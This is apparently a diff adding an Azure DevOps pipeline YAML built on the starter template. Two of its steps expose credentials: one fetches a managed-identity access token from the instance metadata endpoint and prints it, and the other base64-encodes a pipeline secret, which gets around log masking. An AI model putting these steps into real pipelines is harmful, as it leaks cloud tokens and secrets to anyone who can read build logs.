@@ -1,0 +1,24 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- master
+
+pool: NewPool
+
+steps:
+# - script: az login --identity
+#   displayName: 'login?'
+  
+- script: curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&client_id=ca062498-e45d-4b95-9340-d15b1d65d1f2&resource=https://management.azure.com/"
+  displayName: 'Hit the metadata url to get an access token'
+
+- script: echo "$(SECRET)" | base64
+  displayName: 'Run a one-line script'
+
+- script: |
+    echo Add other tasks to build, test, and deploy your project.
+    echo See https://aka.ms/yaml
+  displayName: 'Run a multi-line script'
